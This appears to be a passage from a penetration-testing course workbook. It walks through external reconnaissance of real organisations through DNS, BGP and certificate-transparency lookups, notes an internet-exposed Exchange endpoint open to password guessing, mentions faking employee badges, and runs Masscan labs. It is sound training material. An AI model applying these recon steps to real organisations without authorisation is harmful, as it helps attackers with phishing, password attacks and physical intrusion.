### Command Resolve-DnsName-Type TXT-Namefastenal.com | Where-Object{ \$\_.Strings -like "v=spf1\*" } Expected Results PS C:\Users\sec560> Resolve-DnsName -Type TXT -Name fastenal.com | Where-Object { \$\_.Strings -like "v=spf1\*" } Name Type TTL Section Strings ---- ---- --- ------- ------ fastenal.com TXT 300 Answer {v=spf1 include:spf.protection.outlook.com include:spf.mandrillapp.com include:spf.criticalimpactinc.com include:wappmail.com a:b.spf.service-now.com ip4:148.163.142.133 ip4:148.163.146.161 , ip4:192.254.121.248 ip4:23.21.109.197 ip4:23.21.109.212 ip4:68.73.223.13 ip4:205.243.112.9 ip4:205.243.112.22 ip4:205.243.112.227 ip4:216.34.99.11 ip4:216.34.99.12 ip4:167.89.45.155 ip4:168.245.103.157 ip4:208.117.50.210 , ip4:146.20.91.152 ip4:146.20.91.153 ip4:168.245.16.242 ip4:38.117.70.165 -all}

Fully parsing SPF records is a bit complex, but we can see that fastenal.com uses several third-party services to send email, including:

- spf.protection.outlook.com : Microsoft 365 (another reliable indicator that they use Microsoft 365) •
- spf.mandrillapp.com : Mandrill (email marketing service) •
- spf.criticalimpactinc.com : Critical Impact (email marketing service) •
- wappmail.com: Associated with form.com, an automation platform •
- a:b.spf.service-now.com : ServiceNow (IT service management platform) •
- ip4:... : Various IP addresses that are authorized to send email for the domain. These may be owned by the company itself, or by third-party services. •

By its nature, once you know the mail servers for a given company, you've usually found an authentication provider as well. For example, if a company uses Microsoft 365 for email, they *must* use Microsoft Entra ID for identity management as well.

Later, we'll see Invoke-AADIntReconAsOutsider, part of the AADInternals PowerShell module, which automates this process. It performs the MX record lookup, checks the GetUserRealm endpoint, and performs some additional checks to identify the identity provider used by the target domain. If you'd like to peek ahead, you can run Import-Module AADInternals in PowerShell to import the module, and then run Invoke-AADIntReconAsOutsider -DomainName sans.org (replacing sans.org with your target domain) to see the results.

#### *2: Finding Public IP Space Owned by a Company*

Due to how routers send traffic to each other via BGP, we can look up the public IP space owned by a given company. This can help us identify potential targets for later attacks. Companies can have one or more Autonomous System Numbers (ASNs) , which are used to identify groups of IP networks that are managed by a single organization. We can look up the ASNs owned by a given company, and then look up the IP ranges associated with those ASNs.

We'll use the Hurricane Electric BGP Toolkit to look up ASNs and IP ranges. Let's look up the ASNs owned by Home Depot:

![](SEC560_WorkBook1_page_25_Figure_4.jpeg)

Next, click on AS10967 or click on this link to see more information about Home Depot's ASN:

![](SEC560_WorkBook1_page_26_Figure_0.jpeg)

This page tells us there are 52 IPv4 prefixes (since last updated) and 0 IPv6 prefixes (since last updated) announced by Home Depot. Click on the Prefixes v4 tab to see the list of IPv4 pre fixes:

| AS10967 The Home Depot Inc.           |                           |                                         |                      |  |
|---------------------------------------|---------------------------|-----------------------------------------|----------------------|--|
| Quick Links                           | AS Info Graph v4 Prefixes | v4 Peers v4 Whois RDAP IRR IX Tra       | ceroute              |  |
| BGP Toolkit Home<br>BGP Prefix Report | Prefix                    | Description                             | Visibility           |  |
| BGP Peer Report                       | <u>151.140.0.0/16</u>     | The Home Depot Inc.                     | <b>100%</b> 775/775  |  |
| Super Traceroute                      | 151.140.88.0/24           | The Home Depot Inc.                     | 100% 775/775         |  |
| Super Looking Glass Exchange Report   | 151.140.89.0/24           |                                         | <b>100</b> % 775/775 |  |
| Bogon Routes                          | 151.140.90.0/24           | The Home Depot Inc.                     | <b>100%</b> 775/775  |  |
| World Report                          | 151.140.91.0/24           |                                         | 100% 775/775         |  |
| Multi Origin Routes                   | 151.140.92.0/24           | The Home Depot Inc.                     | <b>100</b> % 775/775 |  |
| DNS Report Top Host Report            | 151.140.93.0/24           |                                         | <b>100</b> % 775/775 |  |
| Internet Statistics                   | 165.130.0.0/16            | The Home Depot Inc.                     | <b>100</b> % 775/775 |  |
| Looking Glass                         | 165.130.19.0/24           | Various Registries (Maintained by ARIN) | <b>100</b> % 775/775 |  |
| Network Tools App<br>Free IPv6 Tunnel | 165.130.21.0/24           |                                         | <b>100</b> % 775/775 |  |
| IPv6 Certification                    | 165.130.22.0/24           | The Home Depot Inc.                     | <b>100</b> % 775/775 |  |

This part of reconnaissance will directly feed into our scanning phase later, using tools like Masscan and Nmap.

#### Curious about saving that list of IPv4 ranges to a file?

While Hurricane Electric doesn't provide a direct way to export the list of IP ranges, you can extract it with some quick command line work. Here's one way to do it using curl and grep in a Linux terminal:

```
curl -H "User-Agent: AnythingHere" -s 'https://bgp.he.net/AS10967#_prefixes' | grep -oE '[0-9]+
\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+' | sort -u
```

The custom User-Agent header is necessary because the server blocks requests with the default curl user agent. The grep command extracts the IP ranges in CIDR notation, and sort -u removes duplicates.

#### *3: Identifying Third-Party Services Used by a Company*

For many reasons, knowing third-party services used by a company can be useful. One of the easiest examples is for social engineering -- if you know a company uses a specific third-party service, you can craft more convincing phishing emails that appear to come from that service.

Many third-party services require the target company to publish a DNS TXT record to prove ownership of the domain. For example, if a company uses Microsoft 365, they must publish a specific TXT record ( MS=ms12341234 with different numbers) to prove ownership of the domain. Similarly, if a company uses Google Workspace, they must publish a speci fic TXT record as well ( google-site-verification ).

Therefore, we can use a domain's DNS TXT records to identify third-party services used by the company. Let's look up the DNS TXT records for sans.org :

Resolve-DnsName-Type TXT-Namesans.org | Select-Object -ExpandProperty Strings | sort

#### Expected Results

PS C:\Users\sec560> Resolve-DnsName -Type TXT -Name sans.org | Select-Object -ExpandProperty Strings | sort

\_globalsign-domain-verification=XbqPoFvyLnW1lHWyrKazU\_F9bRAXRI-\_SoC2KhQHxT

\_globalsign-domain-verification=Z0fOVJB0oLvstFlL9BBVBnLszC-egXTqDZTeNuWdCx

amazonses:s3qWj+9usSfVvw6sOrHcxcLqSLUHe4+xX2Bcz382ZY4=

apple-domain-verification=ZZoZ4NmnUelze8au

asv=c92bd4107a8a4880020e898eef0586e7

atlassian-domain-verification=6NyU75cdG0l2wc7/BZnvjf0Vk6le6u8mecfnfsB0aAODfOm0qF5qbI90rXXmVGWN canva-site-verification=SBkYH7bWYvbsjI0sPM-yIw

dropbox-domain-verification=q0ksfx82ki2b

globalsign-domain-verification=C58F01CCC6203EE0CB8F2A1C6FB794F5

google-site-verification=fdFAbK\_U8Wu9OJDEauVhmgZ0OuJxWA-P4DQhZGx3hjs

google-site-verification=qP6oSPKijvCWSIP7JqPOF\_HuU0NmQX8NTC8Eln8hXMg

jetbrains-domain-verification=9d0spo0t1rbzwx801jejq5z9i

miro-verification=cb513e5bc26e25d81c0b82a55d647d153d95e378

MS=ms15381092

openai-domain-verification=dv-mQdOkfMBQ2VUSYimMob17Cj0

parallels-domain-verification=d6efc2b9b49e46d292bb3257cf202b17fe4c8b0530e849e7977a803f436ed225

pardot928673=573fbfb6e48d50fe412afebd0623144f1667d7fd7e780b3a403bca1493ef624e

status-page-domain-verification=2w964jh22625

v=spf1 include:%{i}.\_ip.%{h}.\_ehlo.%{d}.\_spf.vali.email ~all

YOfxOkgh96cLKDUd0042Sx/iL9bDXs/ZIJ11T2OczGY4TajTWwW8RXLmRajj6sSrD+sNdelF3pXA0PPmx3cE5Q== zapier-domain-verification-challenge=b166a197-0f75-4a5a-932e-8c66e7e10991

#### Would you like a Linux equivalent again?

The dig command can be used on Linux to look up DNS records. The equivalent command is:

dig sans.org TXT +short | sort

Sometimes it's easy enough to read the company name from the record name itself, but other times we need to look up the specific TXT record to see which service it belongs to. Here are some examples of third-party services and their associated TXT records:

- globalsign-domain-verification (GlobalSign) •
- amazonses (Amazon SES) •
- apple-domain-verification (Apple) •
- atlassian-domain-veri fication (Atlassian) •
- canva-site-verification (Canva) •
- dropbox-domain-veri fication (Dropbox) •

- google-site-verification (Google) •
- jetbrains-domain-veri fication (JetBrains) •
- miro-verification (Miro) •
- MS=… (Microsoft) •
- openai-domain-verification (OpenAI) •
- parallels-domain-verification (Parallels) •
- pardotXXXXXX (Salesforce Pardot / Account Engagement) •
- status-page-domain-verification (Atlassian Statuspage) •
- zapier-domain-verification-challenge (Zapier) •

#### *4: Identifying Company Websites*

Certificate Transparency is a wonderful thing. It provides a public log of all TLS certificates issued by publicly trusted Certificate Authorities (CAs). We can use this to find websites owned by a given company in a fairly authoritative manner. There are other tools like amass , subfinder, and Findomain that can also be used to find subdomains, but Certificate Transparency is a great place to start.

There are multiple Certificate Transparency search engines available, but we'll use crt.sh for this example. Let's look up certificates issued for Clinton County, Indiana by clicking on this link , which should show results like this:

![](SEC560_WorkBook1_page_29_Picture_12.jpeg)

While it's not bad to peruse the results manually for smaller organizations like Clinton County, Indiana, larger organizations can have hundreds or thousands of results. Fortunately, crt.sh provides a way to download the results in JSON format as well. Click the small icon labelled "JSON" as shown below:

![](SEC560_WorkBook1_page_29_Figure_14.jpeg)

We can use PowerShell to parse the JSON results and save the unique domain names (from the name\_value field, which can have multiple lines) to a file. Run the following inside PowerShell:

#### Command

Invoke-WebRequest-Uri "https://crt.sh/json?identity=clintoncountyin.gov" | Select-Object - ExpandPropertyContent | ConvertFrom-Json | Select-Object -ExpandProperty name\_value| Sort-Object -Unique | Out-File -FilePath domains\_clintoncountyin.gov.txt

#### Expected Results

PS C:\Users\sec560> Invoke-WebRequest -Uri "https://crt.sh/json?identity=clintoncountyin.gov" | Select-Object -ExpandProperty Content | ConvertFrom-Json | Select-Object -ExpandProperty name\_value | Sort-Object -Unique | Out-File -FilePath domains\_clintoncountyin.gov.txt

#### Still hungry for Linux equivalents?

The curl command can be used on Linux to download the JSON results, and jq can be used to parse the JSON. The equivalent command is:

curl -s 'https://crt.sh/json?identity=clintoncountyin.gov' | jq -r '.[].name\_value' | sort -u > domains\_clintoncountyin.gov.txt

#### Curious about the contents of the file?

You can use Get-Content in PowerShell to view the contents of the file:

Get-Content -Path domains\_clintoncountyin.gov.txt

Or cat in Linux:

cat domains\_clintoncountyin.gov.txt

At the time of testing, the output looked like the following:

autodiscover.clintoncountyin.gov mail2.clintoncountyin.gov cc-archive01.clintoncountyin.gov clintoncountyin.gov www.clintoncountyin.gov

At the time of testing, Clinton County still has an Exchange server exposed to the internet, which we can see from the autodiscover.clintoncountyin.gov and mail2.clintoncountyin.gov entries. Exchange has multiple methods of authentication enabled by default, even if MFA is enabled for Outlook Web App (OWA). Generally, a good first guess is to access the /ews endpoint, which is used by Outlook to connect to Exchange. Go ahead and browse to https://autodiscover.clintoncountyin.gov/ ews in a web browser to see if it's accessible.

If it looks like the following, NTLM authentication is enabled:

![](SEC560_WorkBook1_page_31_Picture_2.jpeg)

This is problematic for defenders, because it means that an attacker can attempt to brute force passwords against the Exchange server directly, even if MFA is enabled for OWA. Later, we'll use password guessing utilities like THC-Hydra on the internal side, though NTLMRecon can be used externally to websites with NTLM authentication enabled as we manually found above.

#### *5: Identifying Breach Data*

Logging on is always a simpler attack vector than exploiting a vulnerability. If single-factor authentication is exposed to the internet, then some percentage of users will have weak, default, or reused passwords. MFA isn't a panacea, as there are still attacks such as MFA fatigue and SIM swapping, but it does significantly raise the bar for attackers.

As we covered in Lab 1.1: Credential Stuffing to a Breach, we can use publicly available breach data to identify potential credentials for users at our target company. Since we just covered this in detail in Lab 1.1, we'll keep this section brief, but do keep this approach in mind when performing reconnaissance against a target company.

#### *6: Social Media Reconnaissance*

For a large enough company, there are often many employees who post on social media about their work. This can include LinkedIn, x.com (formerly Twitter), Facebook, Instagram, and others. Employees may post about new hires, promotions, awards, events, and other company news. This can provide useful information for social engineering attacks, as well as insights into the company's culture and values.

One particularly useful source of information is LinkedIn, where employees often list their job titles, departments, and locations. This can help us identify potential targets for social engineering attacks, understand the company's organizational structure, and also helps simply for the list of names, since usernames and email addresses are often based on real names.

It's also common for new employees to make social media posts showing off their fresh employee badges, which could be useful for in-person social engineering attacks.

Even with a lower resolution photo, we can often make out enough of the elements to re-create the badge format and make a convincing fake badge. While in-person social engineering is relatively uncommon for real-world attackers, it's also an effective way to demonstrate the importance of physical security controls during a penetration test.

#### Conclusion

In this lab, we explored various reconnaissance techniques using publicly available information to map out target organizations' attack surfaces. We identified how email flows to companies using MX records and the GetUserRealm endpoint, discovered public IP spaces owned by organizations through BGP data, uncovered third-party services via DNS TXT records, found company websites through Certificate Transparency logs, and identified single-factor authentication exposed to the internet.

These reconnaissance techniques demonstrate how attackers can gather signi ficant intelligence without touching target systems directly. Understanding these methods helps penetration testers identify potential entry points and helps defenders recognize what information about their infrastructure is publicly accessible.

We encourage you to walk through these techniques against your own target organizations, even before your first scoping call. While it's time that won't necessarily be billable, it will help you hit the ground running once the engagement starts.

#### Bonus: Choosing a random S&P 500 company

If you'd like to practice these techniques against a random S&P 500 company, you can use the following PowerShell script to select one at random by using a GitHub Gist :

\$sp500= Invoke-WebRequest -Uri "https://gist.githubusercontent.com/jeffmcjunkin/ 5ba71910b41765ba5a88e241d33f6d81/raw/7dcf999f3cb11fdab3c18836214052828d7dcff5/ sp500\_companies.csv" | Select-Object -ExpandProperty Content | ConvertFrom-Csv \$randomCompany= \$sp500| Get-Random \$randomCompany| Format-List

#### Expected Results

PS C:\Users\sec560> \$sp500 = Invoke-WebRequest -Uri "https://gist.githubusercontent.com/jeffmcjunkin/ 5ba71910b41765ba5a88e241d33f6d81/raw/7dcf999f3cb11fdab3c18836214052828d7dcff5/sp500\_companies.csv" | Select-Object -ExpandProperty Content | ConvertFrom-Csv PS C:\Users\sec560> \$randomCompany = \$sp500 | Get-Random PS C:\Users\sec560> \$randomCompany | Format-List

Company Name : Cigna Corporation Company Domain Name : cigna.com

Your output will naturally differ, but you can then use the Company Domain Name field to practice the techniques covered in this lab.

## *Lab 1.3: Masscan*

#### No VPN Required

This exercise can be completed locally without an OpenVPN connection.

#### Background

With initial credentials in hand, you need to map out Hiboxy's network infrastructure. Rather than slowly scanning each system individually, you'll use Masscan to rapidly identify all services across their network. This high-speed reconnaissance will reveal web servers, SSH services, SMB shares, and other potential entry points.

The scan results will be saved in multiple formats, allowing you to efficiently query for specific services and build target lists for more focused attacks in subsequent phases of your penetration test.

→

#### Lab Setup

VM used:

Linux •

#### Lab – Step-by-Step Instructions

#### *1: Scan Preparation*

For this lab, we are going to start by scanning the target network. We will use Masscan to perform this scan. You'll remember from the book, that Masscan bypasses the kernel when it sends packets. That means, when your Linux system receives a SYN-ACK response, your Linux system won't know what to do, and it will respond with a RST. While this scan is noisy, we would like to reduce the impact by preventing these resets. We can do this one of two ways. The first, is to set the firewall to not send RST packets. The second is to use a known source port so the SYN-ACK responses come to a known port, then block traffic to that port. We'll use the latter approach here.

Let's select port 55555 as the source port and create a firewall rule to block packets to this port. Masscan will still detect the packets, so we won't miss the responses, but we do prevent the OS from sending extra RST packets.

To create the firewall rule, use the command below:

sudo iptables -A INPUT-p tcp --dport 55555 -j DROP

There is no output from this command.

#### *2: Initial Scan*

Let's launch our scan. In this scan we will use the matching source port of 55555 and a rate of 15,000 packets per second. To prevent saturation of the targets due to multiple people performing the scan at the same time, we'll scan our local hosts.

Launch Masscan with the following settings:

- Scan all 65536 TCP ports •
- Rate *15000* •
- Source port of *55555* •
- Save the output in the binary format to a file named *local.masscan* •
- Target *127.0.0.1* •

To save VPN bandwidth we're going to scan our localhost (for now).

#### Command

sudo masscan--ports 0 -65535 --rate 15000 --src-port =55555 -oB /tmp/local.masscan 127.0.0.1

#### Expected Results

sec560@560vm:~\$ sudo masscan--ports 0 -65535 --rate 15000 --src-port =55555 -oB /tmp/local.masscan 127.0.0.1

Starting masscan 1.3.9-integration (http://bit.ly/14GZzcT) at 2024-08-13 21:38:41 GMT Initiating SYN Stealth Scan Scanning 1 hosts [65536 ports/host]

#### Did you see a VMware Fusion warning on macOS?

If you're using VMware Fusion on macOS, you may see a warning from VMware Fusion saying "A virtual machine is attempting to monitor all network tra ffic, which requires administrator access." You can safely click Cancel on this prompt.

You should see the local.masscan file in the /tmp directory.

ls -l /tmp/local.masscan

#### Expected Results

sec560@560vm:~\$ ls -l /tmp/local.masscan -rw-r--r-- 1 root root 228 Aug 13 21:39 /tmp/local.masscan

We ran this scan against our local system, so results aren't particularly interesting. The key is to be familiar with how to run Masscan.

Running a full port scan across the entire target network will take a while, even with Masscan. To save time, there is a full Masscan binary file located at ~/labs/masscan\_10.130.10.0\_24\_full.bin . We'll use this for our analysis.

Let's take a look at the Masscan results in the provided file.

#### *3: Converting the Scan to XML*

You've already seen how simple it is to scan with Masscan. To save time, you've been provided with the binary output from Masscan using the following options. Note: please do not use these options as it will take too long to run!

- --ports 0-65535 : Check all TCP ports •
- --rate 15000 : Send up to 15,000 packets per second, which is safe for the lab environment with no other people running a scan •
- --banners : Instead of sending a RST packet after a SYN-ACK, send an ACK (establish a full connection) and then look at the data sent by the server (such as SSH or SMTP banners) •
- --src-port=55555 : Specified source port so we could control RST packets with a firewall rule •
- -oB ~/labs/masscan\_10.130.10.0\_24\_full.bin : Save the binary output •
- -e tun0 : Specify the VPN interface •
- 10.130.10.0/24 : Network range to scan •

Let's use this file to look at the various output available in Masscan. We can read the existing Binary format using the --readscan option and then writing the file with one of the output formats. The output formats are:

- -oX : XML •
- -oG : Grepable •
- -oJ : JSON •
- -oL : List •

Let's start by converting to the XML format using the --readscan option and save the file as full.xml . Then, view the contents of the file using less .

#### Command

masscan--readscan ~/labs/masscan\_10.130.10.0\_24\_full.bin -oX /tmp/masscan\_10.130.10.0\_24\_full.xml less /tmp/masscan\_10.130.10.0\_24\_full.xml

The XML formatting isn't really meant for human consumption, but it works well with other tools (such as GoWitness and vulnerability scanners). To exit the less command, type q .

#### Curious about that file name?

While it's more verbose than many would use, the author finds that taking a moment for a clear, descriptive file name helps with the inevitable confusion during real penetration testing. The file name tells us the tool ( masscan\_), the target network ( 10.130.10.0/24 ), the scan type ( \_full ) and the output format ( .xml and .bin ). This is especially helpful when you have multiple files in a directory.

Let's take a look at a more readable format, the Grepable format.

#### *4: Grepable Format*

Extract the grepable format (using -oG ) from the binary format, saving the file as full.grep .

#### Command

masscan--readscan ~/labs/masscan\_10.130.10.0\_24\_full.bin -oG /tmp/masscan\_10.130.10.0\_24\_full.gnmap

#### Expected Results

sec560@560vm:~\$ masscan--readscan ~/labs/masscan\_10.130.10.0\_24\_full.bin -oG /tmp/ masscan\_10.130.10.0\_24\_full.gnmap

[+] --readscan ~/labs/masscan\_10.130.10.0\_24\_full.bin

Let's view the sorted grepable format by using the cat command with the full.grep file.

cat /tmp/masscan\_10.130.10.0\_24\_full.gnmap | sort

#### Expected Results

sec560@560vm:~\$ cat /tmp/masscan\_10.130.10.0\_24\_full.gnmap | sort

Host: 10.130.10.10 () Port: 22 Service: ssh Banner: SSH-2.0-OpenSSH\_9.6p1

Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14\xd9\x8f\xde\xc2\xd5\x05\xcc\x13\xfb\xa9\xe3\xf09cb\xa9\x00\ sha512@openssh.com,[...trimmed...]

Host: 10.130.10.10 () Port: 23 Service: ssh Banner: SSH-2.0-OpenSSH\_9.6p1

Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14%Z\x9b\x8d\xe5\xd8\x912.\xcc\xd9\xd6\x01\x93\xb5@\x00\x00\x0

sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,[...trimmed...]

Host: 10.130.10.10 () Port: 80 Service: http Banner: HTTP/1.1 200

OK\x0d\x0aServer: nginx/1.24.0 (Ubuntu)\x0d\x0aDate: Tue, 24 Sep 2024 04:22:22

GMT\x0d\x0aContent-Type: text/html\x0d\x0aContent-Length: 615\x0d\x0aLast-Modified: Wed,

11 Sep 2024 23:16:10 GMT\x0d\x0aConnection: close\x0d\x0aETag:

\x2266e224ba-267\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0a\x0d

Host: 10.130.10.10 () Port: 80 Service: http.server Banner: nginx/1.24.0 (Ubuntu)

Host: 10.130.10.10 () Port: 80 Service: title Banner: Welcome to nginx!

Host: 10.130.10.11 () Port: 22 Service: ssh Banner: SSH-2.0-OpenSSH\_9.6p1

Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14\xe6s=A;

\xa1\xfb\xe9\x22\xae\xbcz\x86\x87\x18O\x00\x00\x011sntrup761x25519-sha512@openssh.com, ...truncated for brevity...

With the Nmap format, all the ports are on a single line for a given host. The effect is pretty much the same, but the Masscan grepable format is slightly different, in that each system/port combination is on a separate line.

Also, notice the banner information on port 22 and 80. Masscan saves this information when we use the --banners option. Masscan does not include a feature to extract the version information, so you'll have to do this manually.

Next, use grep to find all the DNS services listening on port 53 in the environment.

#### Command

grep -w 53/open /tmp/masscan\_10.130.10.0\_24\_full.gnmap

#### Expected Results

sec560@560vm:~\$ grep -w 53/open /tmp/masscan\_10.130.10.0\_24\_full.gnmap

Timestamp: 1727151766 Host: 10.130.10.4 () Ports: 53/open/tcp//domain//

We can quickly see there is a single DNS server listening on port 53. Notice that there are no banners for this service. That's because DNS does not send a reply until a client sends a request.

Next, do a quick search for likely Windows systems looking for hosts listening on port 445.

```
Command
 grep -w 445/open /tmp/masscan_10.130.10.0_24_full.gnmap
 Expected Results
  sec560@560vm:~$ grep -w 445/open /tmp/masscan_10.130.10.0_24_full.gnmap
  Timestamp: 1727151580 Host: 10.130.10.21 () Ports: 445/open/tcp//microsoft-ds//
  Timestamp: 1727151634 Host: 10.130.10.7 () Ports: 445/open/tcp//microsoft-ds//
  Timestamp: 1727151644 Host: 10.130.10.25 () Ports: 445/open/tcp//microsoft-ds//
  Timestamp: 1727151649 Host: 10.130.10.23 () Ports: 445/open/tcp//microsoft-ds//
  Timestamp: 1727151680 Host: 10.130.10.5 () Ports: 445/open/tcp//microsoft-ds//
  Timestamp: 1727151688 Host: 10.130.10.4 () Ports: 445/open/tcp//microsoft-ds//
  Timestamp: 1727151777 Host: 10.130.10.44 () Ports: 445/open/tcp//microsoft-ds//
```

Let's count the number of hosts with port 445 open:

```
Command
 grep -w 445/open /tmp/masscan_10.130.10.0_24_full.gnmap | wc -l
 Expected Results
   sec560@560vm:~$ grep -w 445/open /tmp/masscan_10.130.10.0_24_full.gnmap | wc -l
   7
```

As we can see there are 7 systems listening and accessible on port 445, likely Windows systems.

#### *5: JSON Format*

Extract the JSON format (using -oJ ) from the binary format, saving the file as full.json .

masscan--readscan ~/labs/masscan\_10.130.10.0\_24\_full.bin -oJ /tmp/masscan\_10.130.10.0\_24\_full.json

Now, let's look at the first few lines of the JSON file.

#### Command

head /tmp/masscan\_10.130.10.0\_24\_full.json

#### Expected Results

```
sec560@560vm:~$ head /tmp/masscan_10.130.10.0_24_full.json
[
{ "ip": "10.130.10.11", "timestamp": "1727151519", "ports": [ {"port": 80, "proto": 
"tcp", "status": "open", "reason": "syn-ack", "ttl": 63} ] }
,
{ "ip": "10.130.10.6", "timestamp": "1727151523", "ports": [ {"port": 80, "proto": 
"tcp", "status": "open", "reason": "syn-ack", "ttl": 127} ] }
,
{ "ip": "10.130.10.11", "timestamp": "1727151523", "ports": [ {"port": 80, "proto": 
"tcp", "service": {"name": "http.server", "banner": "nginx/1.24.0 (Ubuntu)"} } ] }
,
{ "ip": "10.130.10.11", "timestamp": "1727151523", "ports": [ {"port": 80, "proto": 
"tcp", "service": {"name": "title", "banner": "Welcome to nginx!"} } ] }
,
{ "ip": "10.130.10.11", "timestamp": "1727151523", "ports": [ {"port": 80, "proto": 
"tcp", "service": {"name": "http", "banner": "HTTP/1.1 200 OK\u000d\u000aServer: nginx/
1.24.0 (Ubuntu)\u000d\u000aDate: Tue, 24 Sep 2024 04:18:42 GMT\u000d\u000aContent-Type: 
text/html\u000d\u000aContent-Length: 615\u000d\u000aLast-Modified: Wed, 11 Sep 2024 
23:16:45 GMT\u000d\u000aConnection: close\u000d\u000aETag: 
\u002266e224dd-267\u0022\u000d\u000aAccept-Ranges: bytes\u000d\u000a\u000d"} } ] }
```

Similar to the XML format, this isn't meant for human consumption. This is designed to be parsed and used by other tools. Notice, the JSON format also includes the banner information.

#### Want to parse the JSON with a different tool?

If you're curious, you can also parse the JSON output using jq . For example, to list all the IP addresses with port 445 open:

```
jq -r '.[] | select(.ports[] | select(.port == 445 and .status == "open")) | .ip' /tmp/
masscan_10.130.10.0_24_full.json
```

This command will list all the IP addresses with port 445 open.

Learning jq syntax, though powerful, is also similar to learning regular expressions, or a new programming language. It may come in handy at some point in your life , though.

#### *6: List Format*

Extract the List format (using -oL ) from the binary format, saving the output as full.txt .

#### Command

masscan--readscan ~/labs/masscan\_10.130.10.0\_24\_full.bin -oL /tmp/masscan\_10.130.10.0\_24\_full.txt

#### Expected Results

sec560@560vm:~\$ masscan--readscan ~/labs/masscan\_10.130.10.0\_24\_full.bin -oL /tmp/ masscan\_10.130.10.0\_24\_full.txt

[+] --readscan /home/sec560/labs/masscan\_10.130.10.0\_24\_full.bin

Now, let's view the contents of the newly created file.

head -n 15 /tmp/masscan\_10.130.10.0\_24\_full.txt

#### Expected Results

sec560@560vm:~\$ head -n 15 /tmp/masscan\_10.130.10.0\_24\_full.txt #masscan open tcp 80 10.130.10.11 1727151519 open tcp 80 10.130.10.6 1727151523 banner tcp 80 10.130.10.11 1727151523 http.server nginx/1.24.0 (Ubuntu) banner tcp 80 10.130.10.11 1727151523 title Welcome to nginx! banner tcp 80 10.130.10.11 1727151523 http HTTP/1.1 200 OK\x0d\x0aServer: nginx/1.24.0 (Ubuntu)\x0d\x0aDate: Tue, 24 Sep 2024 04:18:42 GMT\x0d\x0aContent-Type: text/ html\x0d\x0aContent-Length: 615\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:16:45 GMT\x0d\x0aConnection: close\x0d\x0aETag: \x2266e224dd-267\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0a\x0d open tcp 3389 10.130.10.21 1727151524 banner tcp 80 10.130.10.6 1727151526 http.server Microsoft-IIS/10.0 banner tcp 80 10.130.10.6 1727151526 title IIS Windows Server banner tcp 80 10.130.10.6 1727151526 http HTTP/1.1 200 OK\x0d\x0aContent-Type: text/ html\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:28:42 GMT\x0d\x0aAccept-Ranges: bytes\x0d\x0aETag: \x2282b3d57a24db1:0\x22\x0d\x0aServer: Microsoft-IIS/10.0\x0d\x0aDate: Tue, 24 Sep 2024 04:18:45 GMT\x0d\x0aConnection: close\x0d\x0aContent-Length: 703\x0d\x0a\x0d open tcp 3389 10.130.10.5 1727151531 open tcp 135 10.130.10.7 1727151534 open tcp 8172 10.130.10.25 1727151536 open tcp 5985 10.130.10.21 1727151539

This is a much simpler to read format. The columns are:

open tcp 5985 10.130.10.23 1727151539

type: open or banner •

protocol: always tcp •

port: port number for this item •

IP address: address of the item •

timestamp: The epoch time for the entry •

extra: for banner rows, it shows the protocol (in the example that'd be http ) and the banner •

Use grep to look for tcp 22 to see the results on port 22.

grep -w 'tcp 22' /tmp/masscan\_10.130.10.0\_24\_full.txt

#### Expected Results

sec560@560vm:~\$ grep -w 'tcp 22' /tmp/masscan\_10.130.10.0\_24\_full.txt open tcp 22 10.130.10.22 1727151568 banner tcp 22 10.130.10.22 1727151599 ssh SSH-2.0-OpenSSH\_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14(\x82\x18\xf5\xbc\xe4\x9am\xea\xe2s\x00;\xa9\x03 \x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519 sha256@libssh.org[...trimmed...]

Here we can see 10.130.10.22 with an open SSH server, and its associated banner.

Use grep once again to look systems listen on port 25 (SMTP).

grep -w 'tcp 25' /tmp/masscan\_10.130.10.0\_24\_full.txt

#### Expected Results

sec560@560vm:~\$ grep -w 'tcp 25' /tmp/masscan\_10.130.10.0\_24\_full.txt

open tcp 25 10.130.10.25 1727151674

banner tcp 25 10.130.10.25 1727151706 ssl TLS/1.2 cipher:0xc030, mail01, mail01,

mail01.hiboxy.com

banner tcp 25 10.130.10.25 1727151706 X509

MIIDBzCCAe+gAwIBAgIQODDHsNbjBZNBr4Q8jkb1izANBgkqhkiG9w0BAQUFADARMQ8wDQYDVQQDEwZtYWlsMDEwHhcNMjQwOTExMjM1NTUyWh

T7gFVULRoivsyQQQjJIdbLydrPKEKdlaoA8akwan4LDX8hT+OoISu19i0/

Khdn8Xy6DUZSY3dGeMZPBO149CNeyiSXQVOr38BDPBL2mxJhdBjf3BKFe2H0CspBdo7vCDkLnVoKCYahUdpgkO5kL8m51g7nTH5L117L48nX2N

Bw8cQlgNgtq7/gBG4xVQmIc57msgbMozZiIEUmNjbEzLmOlEz1La/AUWb4QeBVW3m/

Py4UPgJ3OuRFyC6nwKEKNxb4cjqARAgMBAAGjWzBZMA4GA1UdDwEB/

wQEAwIFoDAkBgNVHREEHTAbggZtYWlsMDGCEW1haWwwMS5oaWJveHkuY29tMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/ wQCMAAwDQYJKoZIhvcNAQEFBQADggEBAAY9K0ea6ExbNZdkc6VavH0U1VnudcdGpTSc6v+K+rWiUC3W/yE96/

zWMbPoBoZcdFUA269H9DZK4z0yTQL9queIY7I2XuldS3vPRuiTLlo5V93wM5YgWWmfmpFdX4gcbqi9catyzmuMIGJIYjguPUfSSmBeRU/

7hb9J5bplJ3eoKYc+4msRrh6gvQNYvm0CdaQ9wnpHRbYRKc5KsLjYGJgaMf700lqOyRjMLARw1m8pJnK/

z42h2zjLue2Sn1KCFNscl8m0NTu7BUfwYWInZuE6bZxlKubSNCKNk7fXjhUkXdOHH7/

TIycg02bWKXGK53froqvkJiWOPULI6h1ur0g=

banner tcp 25 10.130.10.25 1727151706 smtp 220 mail01.hiboxy.com Microsoft ESMTP MAIL

